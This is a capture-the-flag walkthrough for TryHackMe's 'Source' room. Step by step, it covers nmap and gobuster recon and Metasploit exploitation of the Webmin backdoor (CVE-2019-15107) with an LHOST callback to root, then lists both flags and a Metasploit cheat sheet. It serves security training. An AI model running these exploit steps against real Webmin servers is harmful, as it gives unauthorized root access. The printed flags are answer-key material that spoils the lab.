# TryHackMe Source - Complete Walkthrough

![TryHackMe](https://img.shields.io/badge/TryHackMe-Source-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Web%20Exploitation-blue?style=for-the-badge)

## 📋 Table of Contents
- [Overview](#overview)
- [Initial Reconnaissance](#initial-reconnaissance)
- [Webmin Exploitation](#webmin-exploitation)
- [Post-Exploitation](#post-exploitation)
- [Flags](#flags)
- [Key Learnings](#key-learnings)
- [Tools Used](#tools-used)

## 🎯 Overview
Source is a beginner-friendly machine focusing on:
- **Webmin** service exploitation
- **Metasploit** usage for known vulnerabilities
- **Supply chain attack** concepts
- **Quick wins** through automated exploitation

## 🔍 Initial Reconnaissance

### 🌐 Port Scanning
```bash
nmap -sC -sV -oN nmap_scan.txt <TARGET_IP>
```

### 📊 Scan Results
**🎯 Open Ports:**
- **22/tcp** - SSH OpenSSH (version varies)
- **10000/tcp** - HTTP Webmin service

**🔍 Key Observations:**
- SSH requires credentials (not immediately useful)
- **Webmin** running on port 10000 (high-value target)
- HTTPS service on non-standard port

## 🌐 Web Service Analysis

### 🔒 HTTPS Access
1. **Navigate to:** `https://<TARGET_IP>:10000`
2. **Certificate warning:** Accept and proceed (self-signed certificate)
3. **Service identified:** Webmin login interface

### 🚪 Login Interface
**🎯 Findings:**
- Webmin administrative interface
- Login form requiring credentials
- No obvious default credentials work

### 📁 Directory Enumeration
```bash
gobuster dir -u https://<TARGET_IP>:10000 -w /usr/share/seclists/Discovery/Web-Content/big.txt -k
```

**🔍 Results:** Standard Webmin directories found, but no immediate vulnerabilities

## 💥 Webmin Exploitation

### 🔍 Vulnerability Research
Since directory enumeration and credential guessing failed, research known Webmin vulnerabilities.

### 🎯 Metasploit Framework
```bash
# Start Metasploit
msfconsole

# Search for Webmin exploits
search webmin
```

### 📋 Available Exploits
**🎯 Key Findings:**
- Multiple Webmin exploits available
- Look for exploits that **don't require authentication**
- **CVE-2019-15107** - Webmin backdoor (excellent choice)

### 🚀 Backdoor Exploitation

#### 🔧 Exploit Selection
```bash
# Use the backdoor exploit
use exploit/linux/http/webmin_backdoor

# Show exploit information
show info

# Show required options
show options
```

#### ⚙️ Configuration
```bash
# Set target host
set RHOSTS <TARGET_IP>

# Set local host (your IP)
set LHOST <YOUR_IP>

# CRITICAL: Enable SSL
set SSL true

# Verify settings
show options
```

**⚠️ Important:** The `SSL true` setting is crucial for HTTPS Webmin instances.

#### 🎯 Execution
```bash
# Launch the exploit
run
# OR
exploit
```

### 🎉 Shell Access
**✅ Success:** Meterpreter session established with root privileges!

## 🔧 Post-Exploitation

### 🐚 Shell Stabilization
```bash
# Get a stable shell
shell

# Upgrade to interactive shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### 🏆 Flag Collection

#### 👤 User Flag
```bash
# Navigate to user directory
cd /home/dark

# Read user flag
cat user.txt
```

#### 👑 Root Flag
```bash
# Navigate to root directory
cd /root

# Read root flag
cat root.txt
```

## 🏆 Flags
- **👤 User Flag:** `THM{SUPPLY_CHAIN_COMPROMISE}`
- **👑 Root Flag:** `THM{UPDATE_YOUR_INSTALL}`

## 📚 Key Learnings

### 🔍 Reconnaissance Insights
- **Non-standard ports** often run critical services
- **HTTPS services** require proper SSL handling in tools
- **Service identification** is crucial for targeted attacks

### 💥 Webmin Security
- **Webmin backdoor** (CVE-2019-15107) was a supply chain attack
- **Default installations** may contain malicious code
- **Regular updates** are critical for security

### 🎯 Metasploit Mastery
- **Search functionality** helps find relevant exploits quickly
- **SSL configuration** is often overlooked but critical
- **Authentication requirements** vary between exploits
- **Meterpreter sessions** provide powerful post-exploitation capabilities

### 🚀 Supply Chain Attacks
- **Third-party software** can be compromised at source
- **Backdoors** may be inserted during development/distribution
- **Trust relationships** can be exploited by attackers
- **Verification processes** are essential for software integrity

## 🛠️ Tools Used
- `nmap` - Port scanning and service enumeration
- `gobuster` - Directory enumeration (with SSL support)
- `metasploit` - Automated exploitation framework
- `msfconsole` - Metasploit command interface

## 🎯 Attack Chain Summary
```
1. Port Scan → Webmin on 10000/tcp
2. Service Analysis → HTTPS Webmin interface
3. Vulnerability Research → CVE-2019-15107 backdoor
4. Metasploit → Automated exploitation
5. Root Shell → Direct administrative access
6. Flag Collection → Both user and root flags
```

## 🔧 Metasploit Command Reference

### 📋 Essential Commands
```bash
# Start Metasploit
msfconsole

# Search for exploits
search <service_name>
search type:exploit platform:linux

# Use an exploit
use <exploit_path>

# Show exploit information
info
show info

# Show and set options
show options
set <OPTION> <VALUE>

# Execute exploit
run
exploit

# Background session
background

# List sessions
sessions -l

# Interact with session
sessions -i <session_id>
```

### 🌐 SSL-Specific Settings
```bash
# Enable SSL for HTTPS targets
set SSL true

# Verify SSL settings
show advanced
```

## ⚠️ Common Pitfalls

### 🔒 SSL Configuration Issues
- **Forgetting SSL true** for HTTPS services
- **Certificate verification** problems
- **Port/protocol mismatches**

### 🎯 Target Configuration
- **Wrong RHOSTS** (target IP)
- **Wrong LHOST** (local IP for callbacks)
- **Network connectivity** issues

### 🔍 Exploit Selection
- **Choosing authenticated exploits** when you lack credentials
- **Platform mismatches** (Windows vs Linux)
- **Version compatibility** issues

---

> **💡 Pro Tip:** The Webmin backdoor incident (CVE-2019-15107) highlights the importance of supply chain security. Always verify software sources and maintain updated installations.

**Author:** Your Security Notes  
**Date:** Created for TryHackMe Source Room  
**Difficulty:** Easy  
**Tags:** `#tryhackme` `#webmin` `#metasploit` `#backdoor` `#supplychain`
